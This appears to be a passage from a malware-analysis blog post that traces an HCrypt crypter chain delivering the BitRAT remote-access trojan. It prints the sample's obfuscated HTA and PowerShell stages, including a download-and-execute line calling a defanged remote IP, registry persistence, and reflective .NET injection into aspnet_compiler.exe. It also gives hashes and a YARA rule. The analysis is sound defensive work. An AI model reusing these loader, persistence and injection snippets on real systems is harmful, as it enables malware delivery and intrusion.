&lt;script language=javascript&gt;document.write(unescape('%3Cscript%20language%3D%22VBScript%22%3E%0AFunction%20var_func%28%29%0AHB%20%3D%20replace%28%22pow%28-_-%29rsh%28-_-%29ll%20%22%2C%22%28-_-%29%22%2C%22e%22%29%0AHBB%20%3D%20%22%24@@@x%20%3D%20%27hxxp://135.148.74[.]241/S_B.txt%27%3B%24@@@...self.close%0A%3C/script%3E'))&lt;/script&gt;
'@</span><span class="w">
</span><span class="n">Set-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\ProgramData\3814364655181379114711\3814364655181379114711.HTA</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$FFF</span><span class="w">

</span><span class="n">start-sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">3</span><span class="w">

</span><span class="nv">$Hx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'hxxp://135.148.74[.]241/S_B.txt'</span><span class="p">;</span><span class="w">
</span><span class="nv">$HB</span><span class="o">=</span><span class="p">(</span><span class="s1">'{2}{0}{1}'</span><span class="w"> </span><span class="nt">-f</span><span class="s1">'---------l---------o---------a---------d---------'</span><span class="o">...</span><span class="s1">''</span><span class="p">)</span><span class="o">|</span><span class="n">InVokE-ExpresSioN</span><span class="w">
</span></pre></table></code></div></div><p>After decoding using a PowerShell console, we have the cleartext below. Sure enough, the sample contains code to create a persistence mechanism in a Windows Registry key. The value of that key leads to the HTA dropped on disk.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">system.io.directory</span><span class="p">]::</span><span class="n">CreateDirectory</span><span class="p">(</span><span class="nv">$HHxHH</span><span class="p">)</span><span class="w">
</span><span class="n">start-sleep</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">5</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Startup"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$HHHxHHH</span><span class="p">;</span><span class="w">
</span></pre></table></code></div></div><p>Now that we know what this stage does, let’s move forward to look into <code class="language-plaintext highlighter-rouge">S_B.txt</code>!</p><h2 id="decoding-s_btxt-powershell-stage-04last-stop"><span class="mr-2">Decoding S_B.txt PowerShell (Stage 04/Last Stop)</span><a href="#decoding-s_btxt-powershell-stage-04last-stop" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In this stage we can immediately see two really large hex-encoded strings that I truncated here to keep the post manageable. The variables <code class="language-plaintext highlighter-rouge">$HH1</code> and <code class="language-plaintext highlighter-rouge">$H4</code> contain two hex strings that likely decode to Windows EXE files. We can immediately tell this because the strings start with <code class="language-plaintext highlighter-rouge">4D5A</code>, which translates from hex into the traditional <code class="language-plaintext highlighter-rouge">MZ</code> magic bytes for Windows EXE files. Further down, the adversary has a <code class="language-plaintext highlighter-rouge">VIP()</code> function that decodes text from base64 strings. Finally, there’s some base64 code at the bottom of the script that has some string obfuscation inside that gets replaced/removed during runtime. If we do the replacement ourselves using find/replace we can have some legible base64 text to decode.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$HH1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'4D5A9::::3 ... ::::::::::::::::::::::'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span><span class="s2">"0"</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$H4</span><span class="o">=</span><span class="s1">'4D5A9::::3 ... :::::'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span><span class="s2">"0"</span><span class="p">)</span><span class="w">

</span><span class="kr">FUNCTION</span><span class="w"> </span><span class="nf">VIP</span><span class="p">(</span><span class="nv">$9467422421889788552276</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nv">$8398517835117813353988</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Get1859655144789612381153ng"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">"1859655144789612381153"</span><span class="p">,</span><span class="s2">"Stri"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$4699715146936475627384</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">];</span><span class="nv">$7899832798818496373215</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"U76241165786257964469388"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">"7624116578625796446938"</span><span class="p">,</span><span class="s2">"tf"</span><span class="p">)</span><span class="w">
    </span><span class="nv">$5654519196338572648864</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Fr"</span><span class="o">+</span><span class="s2">"omBa"</span><span class="o">+</span><span class="s2">"se6"</span><span class="o">+</span><span class="s2">"4Str"</span><span class="o">+</span><span class="s2">"ing"</span><span class="w">
    </span><span class="nv">$1436688125918197238672</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$4699715146936475627384</span><span class="p">::</span><span class="nv">$7899832798818496373215</span><span class="o">.</span><span class="nv">$8398517835117813353988</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="nv">$5654519196338572648864</span><span class="p">(</span><span class="nv">$9467422421889788552276</span><span class="p">))</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$1436688125918197238672</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$AAAAASXXX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'5961151185971873545969W15961151185971 ... 185971873545969nKXx5961151185971873545969JYEV5961151185971873545969gWA5961151185971873545969=5961151185971873545969=5961151185971873545969'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">"5961151185971873545969"</span><span class="p">,</span><span class="s2">""</span><span class="p">)</span><span class="w">
</span><span class="nv">$AAAAASXXXX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VIP</span><span class="p">(</span><span class="nv">$AAAAASXXX</span><span class="p">);</span><span class="w">
</span><span class="n">IEX</span><span class="w"> </span><span class="nv">$AAAAASXXXX</span><span class="w">
</span></pre></table></code></div></div><p>And after decoding the text ourselves, we have the chunk of code below! This chunk of code takes the hex-encoded strings and converts them into byte arrays. This is significant for a couple reasons in malware analysis. First, if the adversary simply wanted to execute the malware, they could run <code class="language-plaintext highlighter-rouge">Start-Process</code> or call the EXE manually. Holding the binaries as byte arrays means they’re planning to use them programmatically in PowerShell or .NET code, usually with some form of injection or reflective loading. Sure enough, at the end of the script contents we can see <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-6.0#system-reflection-assembly-load(system-byte())"><code class="language-plaintext highlighter-rouge">[Reflection.Assembly]::Load()</code></a>. This call loads the contents of the <code class="language-plaintext highlighter-rouge">$H5</code> binary into memory for use. These contents are likely a .NET DLL. The rest of the code calls the function <code class="language-plaintext highlighter-rouge">HHH()</code> from the class <code class="language-plaintext highlighter-rouge">HH.HH</code> in that loaded DLL, providing the input string containing <code class="language-plaintext highlighter-rouge">aspnet_compiler.exe</code> and the byte array <code class="language-plaintext highlighter-rouge">$H6</code> which likely contains a payload the adversary intends to inject into <code class="language-plaintext highlighter-rouge">aspnet_compiler.exe</code>. I’ll cover this a bit more at the end of the post, but this style of payload delivery is incredibly common among modern crypters that adversaries use to shield their payloads. For the threat intel geeks, take note of the string <code class="language-plaintext highlighter-rouge">$HBAR</code> in the PowerShell code. This is <a href="https://blog.morphisec.com/tracking-hcrypt-an-active-crypter-as-a-service">one indicator we’re looking at HCrypt</a>.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$H1</span><span class="o">=</span><span class="w"> </span><span class="nv">$HH1</span><span class="w">
</span><span class="kr">Function</span><span class="w"> </span><span class="nf">H2</span><span class="w"> </span><span class="p">{</span><span class="w">
 
    </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span><span class="w">
    </span><span class="p">[</span><span class="n">OutputType</span><span class="p">([</span><span class="n">byte</span><span class="p">[]])]</span><span class="w">
    </span><span class="kr">param</span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="bp">$true</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$HBAR</span><span class="w">
    </span><span class="p">)</span><span class="w">
    </span><span class="nv">$H3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="p">(</span><span class="nv">$HBAR</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">)</span><span class="w">
    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$HBAR</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$H3</span><span class="p">[</span><span class="nv">$i</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToByte</span><span class="p">(</span><span class="nv">$HBAR</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="n">return</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$H3</span><span class="w">
</span><span class="p">}</span><span class="w">


</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="nv">$H5</span><span class="o">=</span><span class="n">H2</span><span class="w"> </span><span class="nv">$H4</span><span class="w">
</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="nv">$H6</span><span class="o">=</span><span class="w"> </span><span class="n">H2</span><span class="w"> </span><span class="nv">$H1</span><span class="w">
</span><span class="nv">$H12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'C:\Windows\Microsoft.NET\Framework\v4.0.30\aspnet_compiler.exe'</span><span class="w">
</span><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">(</span><span class="nv">$H5</span><span class="p">)</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'HH.HH'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetMethod</span><span class="p">(</span><span class="s1">'HHH'</span><span class="p">)</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,[</span><span class="n">object</span><span class="p">[]](,</span><span class="nv">$H6</span><span class="p">))</span><span class="w">
</span></pre></table></code></div></div><p>Now let’s get at those binaries!</p><h2 id="extracting-the-binaries"><span class="mr-2">Extracting the Binaries</span><a href="#extracting-the-binaries" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Not going to lie, I cut some corners here using CyberChef. I used the Find/Replace operation followed by From Hex. Then we can save the contents out to disk and examine them.</p><h2 id="decompiling-the-injector"><span class="mr-2">Decompiling the Injector</span><a href="#decompiling-the-injector" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Alright, the first binary that I extracted was the .NET injection DLL held in <code class="language-plaintext highlighter-rouge">$H5</code>. The .NET code easily compiled with <code class="language-plaintext highlighter-rouge">ilspycmd</code>, but it contained a load of obfuscation. To save some time and space, I’ve gone ahead and included just the relevant parts below. The code contains references to <code class="language-plaintext highlighter-rouge">kernel32</code>, <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><code class="language-plaintext highlighter-rouge">LoadLibraryA</code></a>, and <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress"><code class="language-plaintext highlighter-rouge">GetProcAddress</code></a>. These references mean the code likely imports additional native, non-.NET DLL functions at runtime for its injection operations. We can also see the function <code class="language-plaintext highlighter-rouge">HHH()</code>, which would be a good breakpoint if we decided to get into debugging this .NET code. For the cyber threat intelligence geeks out there, there’s a feature in this code to help you pivot and find more samples in VirusTotal! The GUID <code class="language-plaintext highlighter-rouge">8c863524-938b-4d92-a507-f7032311c0d0</code> can be used with VirusTotal Intelligence or Enterprise to find additional samples using the search <code class="language-plaintext highlighter-rouge">netguid:8c863524-938b-4d92-a507-f7032311c0d0</code>. To learn more about the GUID, take a look at this post in VirusBulletin: <a href="https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/">https://www.virusbulletin.com/virusbulletin/2015/06/using-net-guids-help-hunt-malware/</a></p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTitle</span><span class="p">(</span><span class="s">"Bit"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyDescription</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyConfiguration</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCompany</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyProduct</span><span class="p">(</span><span class="s">"Bit"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyCopyright</span><span class="p">(</span><span class="s">"Copyright ©  2021"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyTrademark</span><span class="p">(</span><span class="s">""</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">ComVisible</span><span class="p">(</span><span class="k">false</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">Guid</span><span class="p">(</span><span class="s">"8c863524-938b-4d92-a507-f7032311c0d0"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyFileVersion</span><span class="p">(</span><span class="s">"1.0.0.0"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">TargetFramework</span><span class="p">(</span><span class="s">".NETFramework,Version=v4.0"</span><span class="p">,</span> <span class="n">FrameworkDisplayName</span> <span class="p">=</span> <span class="s">".NET Framework 4"</span><span class="p">)]</span>
<span class="p">[</span><span class="n">assembly</span><span class="p">:</span> <span class="nf">AssemblyVersion</span><span class="p">(</span><span class="s">"1.0.0.0"</span><span class="p">)]</span>
<span class="k">namespace</span> <span class="nn">HH</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">HH</span>
    <span class="p">{</span>
        <span class="p">...</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">,</span> <span class="n">EntryPoint</span> <span class="p">=</span> <span class="s">"LoadLibraryA"</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">a</span><span class="p">([</span><span class="nf">MarshalAs</span><span class="p">(</span><span class="n">UnmanagedType</span><span class="p">.</span><span class="n">VBByRefStr</span><span class="p">)]</span> <span class="k">ref</span> <span class="kt">string</span> <span class="n">a</span><span class="p">);</span>

        <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32"</span><span class="p">,</span> <span class="n">CharSet</span> <span class="p">=</span> <span class="n">CharSet</span><span class="p">.</span><span class="n">Ansi</span><span class="p">,</span> <span class="n">EntryPoint</span> <span class="p">=</span> <span class="s">"GetProcAddress"</span><span class="p">,</span> <span class="n">ExactSpelling</span> <span class="p">=</span> <span class="k">true</span><span class="p">,</span> <span class="n">SetLastError</span> <span class="p">=</span> <span class="k">true</span><span class="p">)]</span>
        <span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">b</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">a</span><span class="p">,</span> <span class="p">[</span><span class="nf">MarshalAs</span><span class="p">(</span><span class="n">UnmanagedType</span><span class="p">.</span><span class="n">VBByRefStr</span><span class="p">)]</span> <span class="k">ref</span> <span class="kt">string</span> <span class="n">b</span><span class="p">);</span>

        <span class="p">...</span>

        <span class="k">public</span> <span class="k">static</span> <span class="kt">bool</span> <span class="nf">HHH</span><span class="p">(</span><span class="kt">string</span> <span class="n">HHHHHHHHHHBBBBBBBBBB</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="m">1</span><span class="p">;</span>
            <span class="k">while</span> <span class="p">(!</span><span class="nf">d</span><span class="p">(</span><span class="n">HHHHHHHHHHBBBBBBBBBB</span><span class="p">,</span> <span class="n">HHHHHHHHHHHHHHHHHHHHHHHHHHBBBBBBBBBBBBBBBBBBBBBBBBBBBB</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">num</span> <span class="p">=</span> <span class="k">checked</span><span class="p">(</span><span class="n">num</span> <span class="p">+</span> <span class="m">1</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">num</span> <span class="p">&gt;</span> <span class="m">5</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
        <span class="p">}</span>
</pre></table></code></div></div><p>For now, that’s as much as I want to squeeze from the injector. Assuming it does its job of just injecting code, the interesting stuff will be in the second binary extracted.</p><h3 id="identifying-bitrat"><span class="mr-2">Identifying BitRAT</span><a href="#identifying-bitrat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Once we extract the second binary and name it <code class="language-plaintext highlighter-rouge">payload.bin</code>, we can use <code class="language-plaintext highlighter-rouge">file</code> to triage it. The output says the binary was packed with UPX, and we can unpack the binary using UPX in REMnux! Using <code class="language-plaintext highlighter-rouge">upx -d</code>, we can obtain the original payload. From here we can search VirusTotal for the hashes and import hash, finding that VirusTotal has already seen the file and identifies it as malicious.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>file payload.bin 
<span class="go">payload.bin: PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed

</span><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>upx <span class="nt">-d</span> payload.bin 
<span class="go">                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   3943424 &lt;-   1511424   38.33%    win32/pe     payload.bin

Unpacked 1 file.

</span><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>file payload.bin 
<span class="go">payload.bin: PE32 executable (GUI) Intel 80386, for MS Windows

</span><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>pehash payload.bin 
<span class="go">file
    filepath:   payload.bin
    md5:        e47b1f77a31d1d91625997da66bb1a94
    sha1:       e29f96b7032e2e8447cd5ae6f8aaf0ac85db8cb9
    sha256:     183809b333c8afcea627e845f08f56131ca63fe592498685d93d305207e6c07c
    ssdeep:     98304:X77Pmq33rE/JDLPWZADUGer7B6iY74M/rmlwXVZ:f+R/eZADUXR
    imphash:    71955ccbbcbb24efa9f89785e7cce225
</span></pre></table></code></div></div><p>To get some better attribution on the malware family, we can borrow YARA rules from the <code class="language-plaintext highlighter-rouge">ditekshen</code> on GitHub. Using the rules at <a href="https://github.com/ditekshen/detection/blob/master/yara/malware.yar">https://github.com/ditekshen/detection/blob/master/yara/malware.yar</a> we can run a YARA scan and identify BitRAT.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/bitrat$</span><span class="w"> </span>yara <span class="nt">-s</span> malware.yar payload.bin 
<span class="go">MALWARE_Win_BitRAT payload.bin
</span><span class="gp">0x33abf0:$</span>s1: <span class="se">\p</span>lg<span class="se">\</span>
<span class="gp">0x33ad70:$</span>s3: files_delete
<span class="gp">0x3399bc:$</span>s9: ddos_stop
<span class="gp">0x33abd0:$</span>s10: socks5_srv_start
<span class="gp">0x33adb8:$</span>s16: klg|
<span class="gp">0x3399ec:$</span>s17: Slowloris
<span class="gp">0x33ac60:$</span>s18: Bot ID:
<span class="gp">0x33b198:$</span>t1: &lt;sz&gt;N/A&lt;/sz&gt;
</pre></table></code></div></div><p>The exact rule it hits on is below:</p><pre><code class="language-yara">rule MALWARE_Win_BitRAT {
    meta:
        author = "ditekSHen"
        description = "Detects BitRAT RAT"
        clamav_sig = "MALWARE.Win.Trojan.BitRAT"
    strings:
        $s1 = "\\plg\\" fullword ascii
        $s2 = "klgoff_del" fullword ascii
        $s3 = "files_delete" ascii
        $s4 = "files_zip_start" fullword ascii
        $s5 = "files_exec" fullword ascii
        $s6 = "drives_get" fullword ascii
        $s7 = "srv_list" fullword ascii
        $s8 = "con_list" fullword ascii
        $s9 = "ddos_stop" fullword ascii
        $s10 = "socks5_srv_start" fullword ascii
        $s11 = "/getUpdates?offset=" fullword ascii
        $s12 = "Action: /dlex" fullword ascii
        $s13 = "Action: /clsbrw" fullword ascii
        $s14 = "Action: /usb" fullword ascii
        $s15 = "/klg" fullword ascii
        $s16 = "klg|" fullword ascii
        $s17 = "Slowloris" fullword ascii
        $s18 = "Bot ID:" ascii
        $t1 = "&lt;sz&gt;N/A&lt;/sz&gt;" fullword ascii
        $t2 = "&lt;silent&gt;N/A&lt;/silent&gt;" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (7 of ($s*) or (4 of ($s*) and 1 of ($t*)))
}
</code></pre><p>Now we’ve identified the payload as BitRAT using YARA from a source that is fairly reputable and used in VirusTotal’s crowdsourced rules feature. If you want more details on the malware you can throw it into a sandbox to extract details and indicators.</p><h2 id="injection-is-commonplace-now"><span class="mr-2">Injection is Commonplace Now</span><a href="#injection-is-commonplace-now" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Looping back on the subject of injection, I want to reiterate that injection is incredibly common. Crypter products and services like HCrypt and Snip3 provide ready-made encryption functionality for adversaries to simply check boxes and execute. For injection, these crypters are going to work in a similar method:</p><p>Deploy injector -&gt; Spawn process -&gt; Inject byte array into process</p><p>The differences between the crypters are simply the implementation details. For Snip3, I’ve seen samples where the crypter delivers its injector component in obfuscated C# code and then compiles it at runtime for injection. In cases like Aggah malware threats, I’ve seen more samples that look like HCrypt where we have two binaries encoded in the same script. Injection isn’t just for fancy stuff anymore, it’s trivial for adversaries to implement.</p><p>Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/hcrypt/" class="post-tag no-text-decoration" >hcrypt</a> <a href="/tags/process-injection/" class="post-tag no-text-decoration" >process-injection</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/hta/" class="post-tag no-text-decoration" >hta</a> <a href="/tags/bitrat/" class="post-tag no-text-decoration" >bitrat</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET - Tony Lambert&amp;url=https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET - Tony Lambert&amp;u=https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/&amp;text=HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/hcrypt-injecting-bitrat-analysis/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" 